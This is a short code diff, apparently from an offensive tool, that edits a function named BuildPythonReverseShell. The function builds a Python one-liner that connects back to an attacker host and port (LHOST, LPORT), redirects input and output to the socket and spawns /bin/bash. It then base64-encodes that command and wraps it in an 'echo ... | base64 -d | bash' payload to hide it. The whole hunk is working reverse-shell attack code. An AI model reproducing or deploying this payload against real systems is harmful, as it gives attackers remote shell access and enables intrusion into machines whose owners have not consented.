@@ -159,7 +159,7 @@ class Shell:
 
 def BuildPythonReverseShell():
 
-    python_rev_shell = '''python2 -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
+    python_rev_shell = '''python -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
 s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()\'''' % (LHOST, LPORT)
     payload = 'echo %s|base64 -d|bash' % base64.b64encode(python_rev_shell)
     return payload
